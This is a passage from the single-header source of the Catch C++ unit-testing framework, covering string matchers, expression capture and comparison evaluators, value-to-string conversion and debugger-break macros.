					virtual std::string toString() const {
						std::ostringstream oss;
						oss << "( ";
						for (std::size_t i = 0; i < m_matchers.size(); ++i) {
							if (i != 0)
								oss << " or ";
							oss << m_matchers[i]->toString();
						}
						oss << " )";
						return oss.str();
					}

					AnyOf operator || (Matcher<ExpressionT> const& other) const {
						AnyOf anyOfExpr(*this);
						anyOfExpr.add(other);
						return anyOfExpr;
					}

				private:
					std::vector<Ptr<Matcher<ExpressionT> > > m_matchers;
				};

			} // namespace Generic

			template<typename ExpressionT>
			Generic::AllOf<ExpressionT> Matcher<ExpressionT>::operator && (Matcher<ExpressionT> const& other) const {
				Generic::AllOf<ExpressionT> allOfExpr;
				allOfExpr.add(*this);
				allOfExpr.add(other);
				return allOfExpr;
			}

			template<typename ExpressionT>
			Generic::AnyOf<ExpressionT> Matcher<ExpressionT>::operator || (Matcher<ExpressionT> const& other) const {
				Generic::AnyOf<ExpressionT> anyOfExpr;
				anyOfExpr.add(*this);
				anyOfExpr.add(other);
				return anyOfExpr;
			}

			template<typename ExpressionT>
			Generic::Not<ExpressionT> Matcher<ExpressionT>::operator ! () const {
				return Generic::Not<ExpressionT>(*this);
			}

			namespace StdString {

				inline std::string makeString(std::string const& str) { return str; }
				inline std::string makeString(const char* str) { return str ? std::string(str) : std::string(); }

				struct CasedString
				{
					CasedString(std::string const& str, CaseSensitive::Choice caseSensitivity)
						: m_caseSensitivity(caseSensitivity),
						m_str(adjustString(str))
					{}
					std::string adjustString(std::string const& str) const {
						return m_caseSensitivity == CaseSensitive::No
							? toLower(str)
							: str;

					}
					std::string toStringSuffix() const
					{
						return m_caseSensitivity == CaseSensitive::No
							? " (case insensitive)"
							: "";
					}
					CaseSensitive::Choice m_caseSensitivity;
					std::string m_str;
				};

				struct Equals : MatcherImpl<Equals, std::string> {
					Equals(std::string const& str, CaseSensitive::Choice caseSensitivity = CaseSensitive::Yes)
						: m_data(str, caseSensitivity)
					{}
					Equals(Equals const& other) : m_data(other.m_data) {}

					virtual ~Equals();

					virtual bool match(std::string const& expr) const {
						return m_data.m_str == m_data.adjustString(expr);;
					}
					virtual std::string toString() const {
						return "equals: \"" + m_data.m_str + "\"" + m_data.toStringSuffix();
					}

					CasedString m_data;
				};

				struct Contains : MatcherImpl<Contains, std::string> {
					Contains(std::string const& substr, CaseSensitive::Choice caseSensitivity = CaseSensitive::Yes)
						: m_data(substr, caseSensitivity) {}
					Contains(Contains const& other) : m_data(other.m_data) {}

					virtual ~Contains();

					virtual bool match(std::string const& expr) const {
						return m_data.adjustString(expr).find(m_data.m_str) != std::string::npos;
					}
					virtual std::string toString() const {
						return "contains: \"" + m_data.m_str + "\"" + m_data.toStringSuffix();
					}

					CasedString m_data;
				};

				struct StartsWith : MatcherImpl<StartsWith, std::string> {
					StartsWith(std::string const& substr, CaseSensitive::Choice caseSensitivity = CaseSensitive::Yes)
						: m_data(substr, caseSensitivity) {}

					StartsWith(StartsWith const& other) : m_data(other.m_data) {}

					virtual ~StartsWith();

					virtual bool match(std::string const& expr) const {
						return startsWith(m_data.adjustString(expr), m_data.m_str);
					}
					virtual std::string toString() const {
						return "starts with: \"" + m_data.m_str + "\"" + m_data.toStringSuffix();
					}

					CasedString m_data;
				};

				struct EndsWith : MatcherImpl<EndsWith, std::string> {
					EndsWith(std::string const& substr, CaseSensitive::Choice caseSensitivity = CaseSensitive::Yes)
						: m_data(substr, caseSensitivity) {}
					EndsWith(EndsWith const& other) : m_data(other.m_data) {}

					virtual ~EndsWith();

					virtual bool match(std::string const& expr) const {
						return endsWith(m_data.adjustString(expr), m_data.m_str);
					}
					virtual std::string toString() const {
						return "ends with: \"" + m_data.m_str + "\"" + m_data.toStringSuffix();
					}

					CasedString m_data;
				};
			} // namespace StdString
		} // namespace Impl

		  // The following functions create the actual matcher objects.
		  // This allows the types to be inferred
		template<typename ExpressionT>
		inline Impl::Generic::Not<ExpressionT> Not(Impl::Matcher<ExpressionT> const& m) {
			return Impl::Generic::Not<ExpressionT>(m);
		}

		template<typename ExpressionT>
		inline Impl::Generic::AllOf<ExpressionT> AllOf(Impl::Matcher<ExpressionT> const& m1,
			Impl::Matcher<ExpressionT> const& m2) {
			return Impl::Generic::AllOf<ExpressionT>().add(m1).add(m2);
		}
		template<typename ExpressionT>
		inline Impl::Generic::AllOf<ExpressionT> AllOf(Impl::Matcher<ExpressionT> const& m1,
			Impl::Matcher<ExpressionT> const& m2,
			Impl::Matcher<ExpressionT> const& m3) {
			return Impl::Generic::AllOf<ExpressionT>().add(m1).add(m2).add(m3);
		}
		template<typename ExpressionT>
		inline Impl::Generic::AnyOf<ExpressionT> AnyOf(Impl::Matcher<ExpressionT> const& m1,
			Impl::Matcher<ExpressionT> const& m2) {
			return Impl::Generic::AnyOf<ExpressionT>().add(m1).add(m2);
		}
		template<typename ExpressionT>
		inline Impl::Generic::AnyOf<ExpressionT> AnyOf(Impl::Matcher<ExpressionT> const& m1,
			Impl::Matcher<ExpressionT> const& m2,
			Impl::Matcher<ExpressionT> const& m3) {
			return Impl::Generic::AnyOf<ExpressionT>().add(m1).add(m2).add(m3);
		}

		inline Impl::StdString::Equals      Equals(std::string const& str, CaseSensitive::Choice caseSensitivity = CaseSensitive::Yes) {
			return Impl::StdString::Equals(str, caseSensitivity);
		}
		inline Impl::StdString::Equals      Equals(const char* str, CaseSensitive::Choice caseSensitivity = CaseSensitive::Yes) {
			return Impl::StdString::Equals(Impl::StdString::makeString(str), caseSensitivity);
		}
		inline Impl::StdString::Contains    Contains(std::string const& substr, CaseSensitive::Choice caseSensitivity = CaseSensitive::Yes) {
			return Impl::StdString::Contains(substr, caseSensitivity);
		}
		inline Impl::StdString::Contains    Contains(const char* substr, CaseSensitive::Choice caseSensitivity = CaseSensitive::Yes) {
			return Impl::StdString::Contains(Impl::StdString::makeString(substr), caseSensitivity);
		}
		inline Impl::StdString::StartsWith  StartsWith(std::string const& substr) {
			return Impl::StdString::StartsWith(substr);
		}
		inline Impl::StdString::StartsWith  StartsWith(const char* substr) {
			return Impl::StdString::StartsWith(Impl::StdString::makeString(substr));
		}
		inline Impl::StdString::EndsWith    EndsWith(std::string const& substr) {
			return Impl::StdString::EndsWith(substr);
		}
		inline Impl::StdString::EndsWith    EndsWith(const char* substr) {
			return Impl::StdString::EndsWith(Impl::StdString::makeString(substr));
		}

	} // namespace Matchers

	using namespace Matchers;

} // namespace Catch

namespace Catch {

	struct TestFailureException {};

	template<typename T> class ExpressionLhs;

	struct STATIC_ASSERT_Expression_Too_Complex_Please_Rewrite_As_Binary_Comparison;

	struct CopyableStream {
		CopyableStream() {}
		CopyableStream(CopyableStream const& other) {
			oss << other.oss.str();
		}
		CopyableStream& operator=(CopyableStream const& other) {
			oss.str("");
			oss << other.oss.str();
			return *this;
		}
		std::ostringstream oss;
	};

	class ResultBuilder {
	public:
		ResultBuilder(char const* macroName,
			SourceLineInfo const& lineInfo,
			char const* capturedExpression,
			ResultDisposition::Flags resultDisposition,
			char const* secondArg = "");

		template<typename T>
		ExpressionLhs<T const&> operator <= (T const& operand);
		ExpressionLhs<bool> operator <= (bool value);

		template<typename T>
		ResultBuilder& operator << (T const& value) {
			m_stream.oss << value;
			return *this;
		}

		template<typename RhsT> STATIC_ASSERT_Expression_Too_Complex_Please_Rewrite_As_Binary_Comparison& operator && (RhsT const&);
		template<typename RhsT> STATIC_ASSERT_Expression_Too_Complex_Please_Rewrite_As_Binary_Comparison& operator || (RhsT const&);

		ResultBuilder& setResultType(ResultWas::OfType result);
		ResultBuilder& setResultType(bool result);
		ResultBuilder& setLhs(std::string const& lhs);
		ResultBuilder& setRhs(std::string const& rhs);
		ResultBuilder& setOp(std::string const& op);

		void endExpression();

		std::string reconstructExpression() const;
		AssertionResult build() const;

		void useActiveException(ResultDisposition::Flags resultDisposition = ResultDisposition::Normal);
		void captureResult(ResultWas::OfType resultType);
		void captureExpression();
		void captureExpectedException(std::string const& expectedMessage);
		void captureExpectedException(Matchers::Impl::Matcher<std::string> const& matcher);
		void handleResult(AssertionResult const& result);
		void react();
		bool shouldDebugBreak() const;
		bool allowThrows() const;

	private:
		AssertionInfo m_assertionInfo;
		AssertionResultData m_data;
		struct ExprComponents {
			ExprComponents() : testFalse(false) {}
			bool testFalse;
			std::string lhs, rhs, op;
		} m_exprComponents;
		CopyableStream m_stream;

		bool m_shouldDebugBreak;
		bool m_shouldThrow;
	};

} // namespace Catch

  // Include after due to circular dependency:
  // #included from: catch_expression_lhs.hpp
#define TWOBLUECUBES_CATCH_EXPRESSION_LHS_HPP_INCLUDED

  // #included from: catch_evaluate.hpp
#define TWOBLUECUBES_CATCH_EVALUATE_HPP_INCLUDED

#ifdef _MSC_VER
#pragma warning(push)
#pragma warning(disable:4389) // '==' : signed/unsigned mismatch
#endif

#include <cstddef>

namespace Catch {
	namespace Internal {

		enum Operator {
			IsEqualTo,
			IsNotEqualTo,
			IsLessThan,
			IsGreaterThan,
			IsLessThanOrEqualTo,
			IsGreaterThanOrEqualTo
		};

		template<Operator Op> struct OperatorTraits { static const char* getName() { return "*error*"; } };
		template<> struct OperatorTraits<IsEqualTo> { static const char* getName() { return "=="; } };
		template<> struct OperatorTraits<IsNotEqualTo> { static const char* getName() { return "!="; } };
		template<> struct OperatorTraits<IsLessThan> { static const char* getName() { return "<"; } };
		template<> struct OperatorTraits<IsGreaterThan> { static const char* getName() { return ">"; } };
		template<> struct OperatorTraits<IsLessThanOrEqualTo> { static const char* getName() { return "<="; } };
		template<> struct OperatorTraits<IsGreaterThanOrEqualTo> { static const char* getName() { return ">="; } };

		template<typename T>
		inline T& opCast(T const& t) { return const_cast<T&>(t); }

		// nullptr_t support based on pull request #154 from Konstantin Baumann
#ifdef CATCH_CONFIG_CPP11_NULLPTR
		inline std::nullptr_t opCast(std::nullptr_t) { return nullptr; }
#endif // CATCH_CONFIG_CPP11_NULLPTR

		// So the compare overloads can be operator agnostic we convey the operator as a template
		// enum, which is used to specialise an Evaluator for doing the comparison.
		template<typename T1, typename T2, Operator Op>
		class Evaluator {};

		template<typename T1, typename T2>
		struct Evaluator<T1, T2, IsEqualTo> {
			static bool evaluate(T1 const& lhs, T2 const& rhs) {
				return bool(opCast(lhs) == opCast(rhs));
			}
		};
		template<typename T1, typename T2>
		struct Evaluator<T1, T2, IsNotEqualTo> {
			static bool evaluate(T1 const& lhs, T2 const& rhs) {
				return bool(opCast(lhs) != opCast(rhs));
			}
		};
		template<typename T1, typename T2>
		struct Evaluator<T1, T2, IsLessThan> {
			static bool evaluate(T1 const& lhs, T2 const& rhs) {
				return bool(opCast(lhs) < opCast(rhs));
			}
		};
		template<typename T1, typename T2>
		struct Evaluator<T1, T2, IsGreaterThan> {
			static bool evaluate(T1 const& lhs, T2 const& rhs) {
				return bool(opCast(lhs) > opCast(rhs));
			}
		};
		template<typename T1, typename T2>
		struct Evaluator<T1, T2, IsGreaterThanOrEqualTo> {
			static bool evaluate(T1 const& lhs, T2 const& rhs) {
				return bool(opCast(lhs) >= opCast(rhs));
			}
		};
		template<typename T1, typename T2>
		struct Evaluator<T1, T2, IsLessThanOrEqualTo> {
			static bool evaluate(T1 const& lhs, T2 const& rhs) {
				return bool(opCast(lhs) <= opCast(rhs));
			}
		};

		template<Operator Op, typename T1, typename T2>
		bool applyEvaluator(T1 const& lhs, T2 const& rhs) {
			return Evaluator<T1, T2, Op>::evaluate(lhs, rhs);
		}

		// This level of indirection allows us to specialise for integer types
		// to avoid signed/ unsigned warnings

		// "base" overload
		template<Operator Op, typename T1, typename T2>
		bool compare(T1 const& lhs, T2 const& rhs) {
			return Evaluator<T1, T2, Op>::evaluate(lhs, rhs);
		}

		// unsigned X to int
		template<Operator Op> bool compare(unsigned int lhs, int rhs) {
			return applyEvaluator<Op>(lhs, static_cast<unsigned int>(rhs));
		}
		template<Operator Op> bool compare(unsigned long lhs, int rhs) {
			return applyEvaluator<Op>(lhs, static_cast<unsigned int>(rhs));
		}
		template<Operator Op> bool compare(unsigned char lhs, int rhs) {
			return applyEvaluator<Op>(lhs, static_cast<unsigned int>(rhs));
		}

		// unsigned X to long
		template<Operator Op> bool compare(unsigned int lhs, long rhs) {
			return applyEvaluator<Op>(lhs, static_cast<unsigned long>(rhs));
		}
		template<Operator Op> bool compare(unsigned long lhs, long rhs) {
			return applyEvaluator<Op>(lhs, static_cast<unsigned long>(rhs));
		}
		template<Operator Op> bool compare(unsigned char lhs, long rhs) {
			return applyEvaluator<Op>(lhs, static_cast<unsigned long>(rhs));
		}

		// int to unsigned X
		template<Operator Op> bool compare(int lhs, unsigned int rhs) {
			return applyEvaluator<Op>(static_cast<unsigned int>(lhs), rhs);
		}
		template<Operator Op> bool compare(int lhs, unsigned long rhs) {
			return applyEvaluator<Op>(static_cast<unsigned int>(lhs), rhs);
		}
		template<Operator Op> bool compare(int lhs, unsigned char rhs) {
			return applyEvaluator<Op>(static_cast<unsigned int>(lhs), rhs);
		}

		// long to unsigned X
		template<Operator Op> bool compare(long lhs, unsigned int rhs) {
			return applyEvaluator<Op>(static_cast<unsigned long>(lhs), rhs);
		}
		template<Operator Op> bool compare(long lhs, unsigned long rhs) {
			return applyEvaluator<Op>(static_cast<unsigned long>(lhs), rhs);
		}
		template<Operator Op> bool compare(long lhs, unsigned char rhs) {
			return applyEvaluator<Op>(static_cast<unsigned long>(lhs), rhs);
		}

		// pointer to long (when comparing against NULL)
		template<Operator Op, typename T> bool compare(long lhs, T* rhs) {
			return Evaluator<T*, T*, Op>::evaluate(reinterpret_cast<T*>(lhs), rhs);
		}
		template<Operator Op, typename T> bool compare(T* lhs, long rhs) {
			return Evaluator<T*, T*, Op>::evaluate(lhs, reinterpret_cast<T*>(rhs));
		}

		// pointer to int (when comparing against NULL)
		template<Operator Op, typename T> bool compare(int lhs, T* rhs) {
			return Evaluator<T*, T*, Op>::evaluate(reinterpret_cast<T*>(lhs), rhs);
		}
		template<Operator Op, typename T> bool compare(T* lhs, int rhs) {
			return Evaluator<T*, T*, Op>::evaluate(lhs, reinterpret_cast<T*>(rhs));
		}

#ifdef CATCH_CONFIG_CPP11_LONG_LONG
		// long long to unsigned X
		template<Operator Op> bool compare(long long lhs, unsigned int rhs) {
			return applyEvaluator<Op>(static_cast<unsigned long>(lhs), rhs);
		}
		template<Operator Op> bool compare(long long lhs, unsigned long rhs) {
			return applyEvaluator<Op>(static_cast<unsigned long>(lhs), rhs);
		}
		template<Operator Op> bool compare(long long lhs, unsigned long long rhs) {
			return applyEvaluator<Op>(static_cast<unsigned long>(lhs), rhs);
		}
		template<Operator Op> bool compare(long long lhs, unsigned char rhs) {
			return applyEvaluator<Op>(static_cast<unsigned long>(lhs), rhs);
		}

		// unsigned long long to X
		template<Operator Op> bool compare(unsigned long long lhs, int rhs) {
			return applyEvaluator<Op>(static_cast<long>(lhs), rhs);
		}
		template<Operator Op> bool compare(unsigned long long lhs, long rhs) {
			return applyEvaluator<Op>(static_cast<long>(lhs), rhs);
		}
		template<Operator Op> bool compare(unsigned long long lhs, long long rhs) {
			return applyEvaluator<Op>(static_cast<long>(lhs), rhs);
		}
		template<Operator Op> bool compare(unsigned long long lhs, char rhs) {
			return applyEvaluator<Op>(static_cast<long>(lhs), rhs);
		}

		// pointer to long long (when comparing against NULL)
		template<Operator Op, typename T> bool compare(long long lhs, T* rhs) {
			return Evaluator<T*, T*, Op>::evaluate(reinterpret_cast<T*>(lhs), rhs);
		}
		template<Operator Op, typename T> bool compare(T* lhs, long long rhs) {
			return Evaluator<T*, T*, Op>::evaluate(lhs, reinterpret_cast<T*>(rhs));
		}
#endif // CATCH_CONFIG_CPP11_LONG_LONG

#ifdef CATCH_CONFIG_CPP11_NULLPTR
		// pointer to nullptr_t (when comparing against nullptr)
		template<Operator Op, typename T> bool compare(std::nullptr_t, T* rhs) {
			return Evaluator<T*, T*, Op>::evaluate(nullptr, rhs);
		}
		template<Operator Op, typename T> bool compare(T* lhs, std::nullptr_t) {
			return Evaluator<T*, T*, Op>::evaluate(lhs, nullptr);
		}
#endif // CATCH_CONFIG_CPP11_NULLPTR

	} // end of namespace Internal
} // end of namespace Catch

#ifdef _MSC_VER
#pragma warning(pop)
#endif

  // #included from: catch_tostring.h
#define TWOBLUECUBES_CATCH_TOSTRING_H_INCLUDED

#include <sstream>
#include <iomanip>
#include <limits>
#include <vector>
#include <cstddef>

#ifdef __OBJC__
  // #included from: catch_objc_arc.hpp
#define TWOBLUECUBES_CATCH_OBJC_ARC_HPP_INCLUDED

#import <Foundation/Foundation.h>

#ifdef __has_feature
#define CATCH_ARC_ENABLED __has_feature(objc_arc)
#else
#define CATCH_ARC_ENABLED 0
#endif

void arcSafeRelease(NSObject* obj);
id performOptionalSelector(id obj, SEL sel);

#if !CATCH_ARC_ENABLED
inline void arcSafeRelease(NSObject* obj) {
	[obj release];
}
inline id performOptionalSelector(id obj, SEL sel) {
	if ([obj respondsToSelector : sel])
		return[obj performSelector : sel];
	return nil;
}
#define CATCH_UNSAFE_UNRETAINED
#define CATCH_ARC_STRONG
#else
inline void arcSafeRelease(NSObject*) {}
inline id performOptionalSelector(id obj, SEL sel) {
#ifdef __clang__
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
#endif
	if ([obj respondsToSelector : sel])
		return[obj performSelector : sel];
#ifdef __clang__
#pragma clang diagnostic pop
#endif
	return nil;
}
#define CATCH_UNSAFE_UNRETAINED __unsafe_unretained
#define CATCH_ARC_STRONG __strong
#endif

#endif

#ifdef CATCH_CONFIG_CPP11_TUPLE
#include <tuple>
#endif

#ifdef CATCH_CONFIG_CPP11_IS_ENUM
#include <type_traits>
#endif

namespace Catch {

	// Why we're here.
	template<typename T>
	std::string toString(T const& value);

	// Built in overloads

	std::string toString(std::string const& value);
	std::string toString(std::wstring const& value);
	std::string toString(const char* const value);
	std::string toString(char* const value);
	std::string toString(const wchar_t* const value);
	std::string toString(wchar_t* const value);
	std::string toString(int value);
	std::string toString(unsigned long value);
	std::string toString(unsigned int value);
	std::string toString(const double value);
	std::string toString(const float value);
	std::string toString(bool value);
	std::string toString(char value);
	std::string toString(signed char value);
	std::string toString(unsigned char value);

#ifdef CATCH_CONFIG_CPP11_LONG_LONG
	std::string toString(long long value);
	std::string toString(unsigned long long value);
#endif

#ifdef CATCH_CONFIG_CPP11_NULLPTR
	std::string toString(std::nullptr_t);
#endif

#ifdef __OBJC__
	std::string toString(NSString const * const& nsstring);
	std::string toString(NSString * CATCH_ARC_STRONG const& nsstring);
	std::string toString(NSObject* const& nsObject);
#endif

	namespace Detail {

		extern const std::string unprintableString;

		struct BorgType {
			template<typename T> BorgType(T const&);
		};

		struct TrueType { char sizer[1]; };
		struct FalseType { char sizer[2]; };

		TrueType& testStreamable(std::ostream&);
		FalseType testStreamable(FalseType);

		FalseType operator<<(std::ostream const&, BorgType const&);

		template<typename T>
		struct IsStreamInsertable {
			static std::ostream &s;
			static T  const&t;
			enum { value = sizeof(testStreamable(s << t)) == sizeof(TrueType) };
		};

#if defined(CATCH_CONFIG_CPP11_IS_ENUM)
		template<typename T,
			bool IsEnum = std::is_enum<T>::value
		>
			struct EnumStringMaker
		{
			static std::string convert(T const&) { return unprintableString; }
		};

		template<typename T>
		struct EnumStringMaker<T, true>
		{
			static std::string convert(T const& v)
			{
				return ::Catch::toString(
					static_cast<typename std::underlying_type<T>::type>(v)
				);
			}
		};
#endif
		template<bool C>
		struct StringMakerBase {
#if defined(CATCH_CONFIG_CPP11_IS_ENUM)
			template<typename T>
			static std::string convert(T const& v)
			{
				return EnumStringMaker<T>::convert(v);
			}
#else
			template<typename T>
			static std::string convert(T const&) { return unprintableString; }
#endif
		};

		template<>
		struct StringMakerBase<true> {
			template<typename T>
			static std::string convert(T const& _value) {
				std::ostringstream oss;
				oss << _value;
				return oss.str();
			}
		};

		std::string rawMemoryToString(const void *object, std::size_t size);

		template<typename T>
		inline std::string rawMemoryToString(const T& object) {
			return rawMemoryToString(&object, sizeof(object));
		}

	} // end namespace Detail

	template<typename T>
	struct StringMaker :
		Detail::StringMakerBase<Detail::IsStreamInsertable<T>::value> {};

	template<typename T>
	struct StringMaker<T*> {
		template<typename U>
		static std::string convert(U* p) {
			if (!p)
				return "NULL";
			else
				return Detail::rawMemoryToString(p);
		}
	};

	template<typename R, typename C>
	struct StringMaker<R C::*> {
		static std::string convert(R C::* p) {
			if (!p)
				return "NULL";
			else
				return Detail::rawMemoryToString(p);
		}
	};

	namespace Detail {
		template<typename InputIterator>
		std::string rangeToString(InputIterator first, InputIterator last);
	}

	//template<typename T, typename Allocator>
	//struct StringMaker<std::vector<T, Allocator> > {
	//    static std::string convert( std::vector<T,Allocator> const& v ) {
	//        return Detail::rangeToString( v.begin(), v.end() );
	//    }
	//};

	template<typename T, typename Allocator>
	std::string toString(std::vector<T, Allocator> const& v) {
		return Detail::rangeToString(v.begin(), v.end());
	}

#ifdef CATCH_CONFIG_CPP11_TUPLE

	// toString for tuples
	namespace TupleDetail {
		template<
			typename Tuple,
			std::size_t N = 0,
			bool = (N < std::tuple_size<Tuple>::value)
			>
			struct ElementPrinter {
			static void print(const Tuple& tuple, std::ostream& os)
			{
				os << (N ? ", " : " ")
					<< Catch::toString(std::get<N>(tuple));
				ElementPrinter<Tuple, N + 1>::print(tuple, os);
			}
		};

		template<
			typename Tuple,
			std::size_t N
		>
			struct ElementPrinter<Tuple, N, false> {
			static void print(const Tuple&, std::ostream&) {}
		};

	}

	template<typename ...Types>
	struct StringMaker<std::tuple<Types...>> {

		static std::string convert(const std::tuple<Types...>& tuple)
		{
			std::ostringstream os;
			os << '{';
			TupleDetail::ElementPrinter<std::tuple<Types...>>::print(tuple, os);
			os << " }";
			return os.str();
		}
	};
#endif // CATCH_CONFIG_CPP11_TUPLE

	namespace Detail {
		template<typename T>
		std::string makeString(T const& value) {
			return StringMaker<T>::convert(value);
		}
	} // end namespace Detail

	  /// \brief converts any type to a string
	  ///
	  /// The default template forwards on to ostringstream - except when an
	  /// ostringstream overload does not exist - in which case it attempts to detect
	  /// that and writes {?}.
	  /// Overload (not specialise) this template for custom typs that you don't want
	  /// to provide an ostream overload for.
	template<typename T>
	std::string toString(T const& value) {
		return StringMaker<T>::convert(value);
	}

	namespace Detail {
		template<typename InputIterator>
		std::string rangeToString(InputIterator first, InputIterator last) {
			std::ostringstream oss;
			oss << "{ ";
			if (first != last) {
				oss << Catch::toString(*first);
				for (++first; first != last; ++first)
					oss << ", " << Catch::toString(*first);
			}
			oss << " }";
			return oss.str();
		}
	}

} // end namespace Catch

namespace Catch {

	// Wraps the LHS of an expression and captures the operator and RHS (if any) -
	// wrapping them all in a ResultBuilder object
	template<typename T>
	class ExpressionLhs {
		ExpressionLhs& operator = (ExpressionLhs const&);
#  ifdef CATCH_CONFIG_CPP11_GENERATED_METHODS
		ExpressionLhs& operator = (ExpressionLhs &&) = delete;
#  endif

	public:
		ExpressionLhs(ResultBuilder& rb, T lhs) : m_rb(rb), m_lhs(lhs) {}
#  ifdef CATCH_CONFIG_CPP11_GENERATED_METHODS
		ExpressionLhs(ExpressionLhs const&) = default;
		ExpressionLhs(ExpressionLhs &&) = default;
#  endif

		template<typename RhsT>
		ResultBuilder& operator == (RhsT const& rhs) {
			return captureExpression<Internal::IsEqualTo>(rhs);
		}

		template<typename RhsT>
		ResultBuilder& operator != (RhsT const& rhs) {
			return captureExpression<Internal::IsNotEqualTo>(rhs);
		}

		template<typename RhsT>
		ResultBuilder& operator < (RhsT const& rhs) {
			return captureExpression<Internal::IsLessThan>(rhs);
		}

		template<typename RhsT>
		ResultBuilder& operator > (RhsT const& rhs) {
			return captureExpression<Internal::IsGreaterThan>(rhs);
		}

		template<typename RhsT>
		ResultBuilder& operator <= (RhsT const& rhs) {
			return captureExpression<Internal::IsLessThanOrEqualTo>(rhs);
		}

		template<typename RhsT>
		ResultBuilder& operator >= (RhsT const& rhs) {
			return captureExpression<Internal::IsGreaterThanOrEqualTo>(rhs);
		}

		ResultBuilder& operator == (bool rhs) {
			return captureExpression<Internal::IsEqualTo>(rhs);
		}

		ResultBuilder& operator != (bool rhs) {
			return captureExpression<Internal::IsNotEqualTo>(rhs);
		}

		void endExpression() {
			bool value = m_lhs ? true : false;
			m_rb
				.setLhs(Catch::toString(value))
				.setResultType(value)
				.endExpression();
		}

		// Only simple binary expressions are allowed on the LHS.
		// If more complex compositions are required then place the sub expression in parentheses
		template<typename RhsT> STATIC_ASSERT_Expression_Too_Complex_Please_Rewrite_As_Binary_Comparison& operator + (RhsT const&);
		template<typename RhsT> STATIC_ASSERT_Expression_Too_Complex_Please_Rewrite_As_Binary_Comparison& operator - (RhsT const&);
		template<typename RhsT> STATIC_ASSERT_Expression_Too_Complex_Please_Rewrite_As_Binary_Comparison& operator / (RhsT const&);
		template<typename RhsT> STATIC_ASSERT_Expression_Too_Complex_Please_Rewrite_As_Binary_Comparison& operator * (RhsT const&);
		template<typename RhsT> STATIC_ASSERT_Expression_Too_Complex_Please_Rewrite_As_Binary_Comparison& operator && (RhsT const&);
		template<typename RhsT> STATIC_ASSERT_Expression_Too_Complex_Please_Rewrite_As_Binary_Comparison& operator || (RhsT const&);

	private:
		template<Internal::Operator Op, typename RhsT>
		ResultBuilder& captureExpression(RhsT const& rhs) {
			return m_rb
				.setResultType(Internal::compare<Op>(m_lhs, rhs))
				.setLhs(Catch::toString(m_lhs))
				.setRhs(Catch::toString(rhs))
				.setOp(Internal::OperatorTraits<Op>::getName());
		}

	private:
		ResultBuilder& m_rb;
		T m_lhs;
	};

} // end namespace Catch


namespace Catch {

	template<typename T>
	inline ExpressionLhs<T const&> ResultBuilder::operator <= (T const& operand) {
		return ExpressionLhs<T const&>(*this, operand);
	}

	inline ExpressionLhs<bool> ResultBuilder::operator <= (bool value) {
		return ExpressionLhs<bool>(*this, value);
	}

} // namespace Catch

  // #included from: catch_message.h
#define TWOBLUECUBES_CATCH_MESSAGE_H_INCLUDED

#include <string>

namespace Catch {

	struct MessageInfo {
		MessageInfo(std::string const& _macroName,
			SourceLineInfo const& _lineInfo,
			ResultWas::OfType _type);

		std::string macroName;
		SourceLineInfo lineInfo;
		ResultWas::OfType type;
		std::string message;
		unsigned int sequence;

		bool operator == (MessageInfo const& other) const {
			return sequence == other.sequence;
		}
		bool operator < (MessageInfo const& other) const {
			return sequence < other.sequence;
		}
	private:
		static unsigned int globalCount;
	};

	struct MessageBuilder {
		MessageBuilder(std::string const& macroName,
			SourceLineInfo const& lineInfo,
			ResultWas::OfType type)
			: m_info(macroName, lineInfo, type)
		{}

		template<typename T>
		MessageBuilder& operator << (T const& value) {
			m_stream << value;
			return *this;
		}

		MessageInfo m_info;
		std::ostringstream m_stream;
	};

	class ScopedMessage {
	public:
		ScopedMessage(MessageBuilder const& builder);
		ScopedMessage(ScopedMessage const& other);
		~ScopedMessage();

		MessageInfo m_info;
	};

} // end namespace Catch

  // #included from: catch_interfaces_capture.h
#define TWOBLUECUBES_CATCH_INTERFACES_CAPTURE_H_INCLUDED

#include <string>

namespace Catch {

	class TestCase;
	class AssertionResult;
	struct AssertionInfo;
	struct SectionInfo;
	struct SectionEndInfo;
	struct MessageInfo;
	class ScopedMessageBuilder;
	struct Counts;

	struct IResultCapture {

		virtual ~IResultCapture();

		virtual void assertionEnded(AssertionResult const& result) = 0;
		virtual bool sectionStarted(SectionInfo const& sectionInfo,
			Counts& assertions) = 0;
		virtual void sectionEnded(SectionEndInfo const& endInfo) = 0;
		virtual void sectionEndedEarly(SectionEndInfo const& endInfo) = 0;
		virtual void pushScopedMessage(MessageInfo const& message) = 0;
		virtual void popScopedMessage(MessageInfo const& message) = 0;

		virtual std::string getCurrentTestName() const = 0;
		virtual const AssertionResult* getLastResult() const = 0;

		virtual void handleFatalErrorCondition(std::string const& message) = 0;
	};

	IResultCapture& getResultCapture();
}

// #included from: catch_debugger.h
#define TWOBLUECUBES_CATCH_DEBUGGER_H_INCLUDED

// #included from: catch_platform.h
#define TWOBLUECUBES_CATCH_PLATFORM_H_INCLUDED

#if defined(__MAC_OS_X_VERSION_MIN_REQUIRED)
#define CATCH_PLATFORM_MAC
#elif  defined(__IPHONE_OS_VERSION_MIN_REQUIRED)
#define CATCH_PLATFORM_IPHONE
#elif defined(WIN32) || defined(__WIN32__) || defined(_WIN32) || defined(_MSC_VER)
#define CATCH_PLATFORM_WINDOWS
#endif

#include <string>

namespace Catch {

	bool isDebuggerActive();
	void writeToDebugConsole(std::string const& text);
}

#ifdef CATCH_PLATFORM_MAC

// The following code snippet based on:
// http://cocoawithlove.com/2008/03/break-into-debugger.html
#ifdef DEBUG
#if defined(__ppc64__) || defined(__ppc__)
#define CATCH_BREAK_INTO_DEBUGGER() \
                if( Catch::isDebuggerActive() ) { \
                    __asm__("li r0, 20\nsc\nnop\nli r0, 37\nli r4, 2\nsc\nnop\n" \
                    : : : "memory","r0","r3","r4" ); \
                }
#else
#define CATCH_BREAK_INTO_DEBUGGER() if( Catch::isDebuggerActive() ) {__asm__("int $3\n" : : );}
#endif
#endif

#elif defined(_MSC_VER)
#define CATCH_BREAK_INTO_DEBUGGER() if( Catch::isDebuggerActive() ) { __debugbreak(); }
#elif defined(__MINGW32__)
extern "C" __declspec(dllimport) void __stdcall DebugBreak();
#define CATCH_BREAK_INTO_DEBUGGER() if( Catch::isDebuggerActive() ) { DebugBreak(); }
#endif

#ifndef CATCH_BREAK_INTO_DEBUGGER
#define CATCH_BREAK_INTO_DEBUGGER() Catch::alwaysTrue();
#endif

// #included from: catch_interfaces_runner.h
#define TWOBLUECUBES_CATCH_INTERFACES_RUNNER_H_INCLUDED

namespace Catch {
	class TestCase;

	struct IRunner {
		virtual ~IRunner();
		virtual bool aborting() const = 0;
	};
}

